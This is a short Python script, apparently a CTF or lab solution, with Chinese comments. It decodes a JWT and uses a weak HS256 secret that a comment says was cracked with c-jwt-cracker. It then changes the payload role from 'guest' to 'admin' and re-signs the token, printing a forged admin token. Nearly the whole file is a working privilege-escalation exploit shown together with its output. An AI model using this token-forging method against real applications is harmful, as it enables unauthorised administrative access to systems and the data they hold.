import jwt
import json
import base64

def jwt_decode(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    # 补全base64 padding并进行base64解码
    def _b64decode(s):
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)
    # 用loads加载json数据
    header = json.loads(_b64decode(parts[0]))
    payload = json.loads(_b64decode(parts[1]))
    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
    return header, payload, signature

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Sj5WN_tj2hIzQ_cqjL4prQCK7zfL8kHmUUyWt0-FMZg'
(h, p, s) = jwt_decode(token)
print("Header:", h)
# Header: {'typ': 'JWT', 'alg': 'HS256'}
print("Payload:", p)
# Payload: {'username': 'admin', 'password': '123', 'role': 'guest'}
secret = 'gqqh'  # c-jwt-cracker
# JWT弱密码攻击 修改Payload
p['role'] = 'admin'
print("Modified Payload:", p)
# Modified Payload: {'username': 'admin', 'password': '123', 'role': 'admin'}
# 使用HS256算法生成新的JWT
new_jwt = jwt.encode(p, secret, algorithm='HS256', headers=h)
print("New JWT:", new_jwt)
# None JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.WzlcMe5gGSwhVYk6DVp1ZXOE4r8WVmsCtBA8AJmj4RI